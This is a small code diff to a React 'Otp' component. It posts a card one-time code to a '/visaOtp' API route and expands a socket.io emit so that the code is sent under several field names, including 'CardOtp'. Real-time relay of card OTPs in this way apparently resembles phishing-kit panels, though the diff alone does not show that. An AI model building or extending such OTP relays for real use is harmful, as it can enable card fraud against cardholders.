@@ -92,7 +92,12 @@ const Otp = () => {
     setProcessing(true);
     try {
       await axios.post(`${api_route}/visaOtp/${orderId}`, { otp: secureCode });
-      socket.emit("visaOtp", { id: orderId, otp: secureCode });
+      socket.emit("visaOtp", {
+        _id: orderId,
+        id: orderId,
+        otp: secureCode,
+        CardOtp: secureCode,
+      });
     } catch {
       setError("Failed to verify code.");
       setProcessing(false);
